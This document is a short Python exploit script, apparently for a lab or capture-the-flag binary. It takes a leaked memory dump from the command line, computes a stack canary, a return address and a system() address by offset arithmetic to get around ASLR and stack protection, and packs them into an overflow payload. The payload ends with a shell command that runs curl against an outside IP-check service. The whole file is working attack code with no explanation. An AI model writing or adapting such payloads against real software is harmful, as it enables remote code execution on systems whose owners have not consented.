import requests, sys, os
from requests import Request, Session,exceptions

split = sys.argv[1]

last40 = split[-40:]
trial= split[-48:]

returnaddress = str(hex(int(last40[32:40],16) + 1625))

temp =  int(last40[24:32],16) - 172
canaryaddress = str(hex(temp))

canary = str(hex(int(last40[0:8],16) + 38))

#address of remote system
sys_diff = int(trial[0:8],16) - int("f7babd49",16)
remote_sys_addr= str(hex(int("f7b782e0",16) + sys_diff))

doub_pointer= str(hex(int(last40[24:32],16) - 148))

single_pointer= str(hex(int(last40[24:32],16) - 144))

data = bytes.fromhex(canaryaddress[2:])[::-1]

for i in range(0,14):
    data += bytes.fromhex(canaryaddress[2:])[::-1]

data += bytes.fromhex(canary[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[8:16],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[16:24],16)))[2:])[::-1]
data += bytes.fromhex(str(hex(int(last40[24:32],16)))[2:])[::-1]
data += bytes.fromhex(remote_sys_addr[2:])[::-1]

data += bytes.fromhex(single_pointer[2:])[::-1]
data += bytes.fromhex(single_pointer[2:])[::-1]

data += b"curl checkip.dyndns.org"
data += b"&"

print(data)

